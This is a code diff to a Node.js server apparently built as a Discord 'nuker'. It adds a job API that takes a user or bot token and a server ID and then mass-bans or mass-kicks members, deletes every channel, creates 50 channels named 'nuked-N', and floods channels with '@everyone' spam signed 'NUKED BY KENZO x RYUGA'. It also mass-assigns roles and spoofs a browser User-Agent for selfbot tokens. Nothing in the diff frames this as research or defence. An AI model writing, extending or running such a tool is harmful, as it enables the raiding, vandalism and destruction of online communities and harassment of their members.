@@ -33,18 +33,15 @@ const DISCORD_API = 'https://discord.com/api/v10';
 const SUPER_PROPS = 'eyJvcyI6IkFuZHJvaWQiLCJicm93c2VyIjoiRGlzY29yZCBBbmRyb2lkIiwiZGV2aWNlIjoibW9iaWxlIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEzKSBBcHBsZVdlYmtpdC81MzcuMzYiLCJicm93c2VyX3ZlcnNpb24iOiIxMjAuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTMiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNTAwMDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9';
 
 function discordHeaders(token, isBot = false) {
-  return {
+  const headers = {
     Authorization: (isBot ? 'Bot ' : '') + token,
     'Content-Type': 'application/json',
-    'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36',
-    'X-Super-Properties': SUPER_PROPS,
-    'X-Discord-Locale': 'en-US',
-    'X-Discord-Timezone': 'UTC',
-    Accept: '*/*',
-    'Accept-Language': 'en-US,en;q=0.9',
-    Origin: 'https://discord.com',
-    Referer: 'https://discord.com/channels/@me',
   };
+  if (!isBot) {
+    // User/selfbot tokens require a Discord-like User-Agent
+    headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
+  }
+  return headers;
 }
 
 async function discordRequest(method, path, body, token, isBot = false) {
@@ -270,6 +267,149 @@ async function getAllMembers(guildId, token) {
   }
   return out;
 }
+
+// ==================== COMMAND JOB API (no CORS - server side) ====================
+const jobs = new Map();
+const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+
+app.post('/api/command', (req, res) => {
+  const { token, isBot, command, guildId } = req.body || {};
+
+  if (!token || !command || !guildId) {
+    return res.status(400).json({ error: 'token, command, guildId required' });
+  }
+  if (!/^\d{17,20}$/.test(String(guildId))) {
+    return res.status(400).json({ error: 'guildId must be 17-20 digits' });
+  }
+
+  const id = 'job_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
+  const job = { id, command, status: 'running', logs: [], done: 0, failed: 0, started: Date.now() };
+  jobs.set(id, job);
+
+  const log = (message, level = 'info') => {
+    job.logs.push({ t: Date.now(), message, level });
+    if (job.logs.length > 500) job.logs.shift();
+  };
+
+  let firstErrorLogged = false;
+  const noteError = (e) => {
+    job.failed++;
+    if (!firstErrorLogged) {
+      firstErrorLogged = true;
+      log('First failure: ' + (e && e.message ? e.message : e), 'warning');
+    }
+  };
+
+  (async () => {
+    try {
+      log('▶ Running ' + command + '...', 'info');
+
+      if (command === 'BAN_ALL' || command === 'KICK_ALL') {
+        const me = await discordRequest('GET', '/users/@me', null, token, isBot);
+        const members = await getAllMembers(guildId, token);
+        log('Found ' + members.length + ' members', 'info');
+
+        for (const m of members) {
+          if (m.user.id === me.id) continue;
+          try {
+            if (command === 'BAN_ALL') {
+              await discordRequest('PUT', `/guilds/${guildId}/bans/${m.user.id}`, { delete_message_seconds: 0 }, token, isBot);
+            } else {
+              await discordRequest('DELETE', `/guilds/${guildId}/members/${m.user.id}`, null, token, isBot);
+            }
+            job.done++;
+          } catch (e) { noteError(e); }
+          if (job.done % 10 === 0) log(command + ': ' + job.done + ' ok, ' + job.failed + ' failed', 'info');
+          await sleep(280);
+        }
+
+      } else if (command === 'DELETE_ALL' || command === 'CREATE_CHANNELS' || command === 'SPAM_ALL') {
+        const channels = await discordRequest('GET', `/guilds/${guildId}/channels`, null, token, isBot);
+        log('Found ' + channels.length + ' channels', 'info');
+
+        if (command === 'DELETE_ALL') {
+          for (const c of channels) {
+            try { await discordRequest('DELETE', `/channels/${c.id}`, null, token, isBot); job.done++; }
+            catch (e) { noteError(e); }
+            if (job.done % 10 === 0) log('Deleted ' + job.done + '/' + channels.length, 'info');
+            await sleep(280);
+          }
+        } else if (command === 'CREATE_CHANNELS') {
+          for (let i = 0; i < 50; i++) {
+            try {
+              await discordRequest('POST', `/guilds/${guildId}/channels`, { name: 'nuked-' + (i + 1), type: 0 }, token, isBot);
+              job.done++;
+            } catch (e) { noteError(e); }
+            if (job.done % 10 === 0) log('Created ' + job.done + '/50', 'info');
+            await sleep(300);
+          }
+        } else {
+          for (const c of channels) {
+            if (c.type !== 0 && c.type !== 5) continue;
+            for (let i = 0; i < 5; i++) {
+              try {
+                await discordRequest('POST', `/channels/${c.id}/messages`, { content: '@everyone **NUKED BY KENZO x RYUGA**' }, token, isBot);
+                job.done++;
+              } catch (e) { noteError(e); }
+              await sleep(320);
+            }
+            log('Spammed #' + c.name + ' (' + job.done + ' sent)', 'info');
+          }
+        }
+
+      } else if (command === 'CLAIM_ROLES') {
+        const roles = await discordRequest('GET', `/guilds/${guildId}/roles`, null, token, isBot);
+        const me = await discordRequest('GET', '/users/@me', null, token, isBot);
+        const self = await discordRequest('GET', `/guilds/${guildId}/members/${me.id}`, null, token, isBot);
+
+        const myTop = (self.roles || [])
+          .map(id => roles.find(r => r.id === id))
+          .filter(Boolean)
+          .reduce((max, r) => Math.max(max, r.position), 0);
+
+        // Discord forbids assigning a role at/above the actor's highest role
+        const target = roles
+          .filter(r => r.position > 0 && r.position < myTop)
+          .sort((a, b) => b.position - a.position)[0];
+
+        if (!target) {
+          throw new Error('No assignable role below your highest role (yours: pos ' + myTop + '). Raise the bot role.');
+        }
+
+        const members = await getAllMembers(guildId, token);
+        log('Claiming "' + target.name + '" (pos ' + target.position + ') on ' + members.length + ' members', 'info');
+
+        for (const m of members) {
+          try {
+            await discordRequest('PATCH', `/guilds/${guildId}/members/${m.user.id}`, { roles: [target.id, ...(m.roles || [])] }, token, isBot);
+            job.done++;
+          } catch (e) { noteError(e); }
+          await sleep(280);
+        }
+      }
+
+      job.status = 'done';
+      log('✅ ' + command + ' finished — ok:' + job.done + ' failed:' + job.failed, 'success');
+    } catch (e) {
+      job.status = 'error';
+      log('❌ ' + command + ' failed: ' + e.message, 'error');
+    }
+  })();
+
+  res.json({ jobId: id });
+});
+
+app.get('/api/job/:id', (req, res) => {
+  const job = jobs.get(req.params.id);
+  if (!job) return res.status(404).json({ error: 'job not found' });
+  res.json(job);
+});
+
+// prune old jobs
+setInterval(() => {
+  const cutoff = Date.now() - 10 * 60 * 1000;
+  for (const [k, v] of jobs) if (v.started < cutoff) jobs.delete(k);
+}, 60000).unref();
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
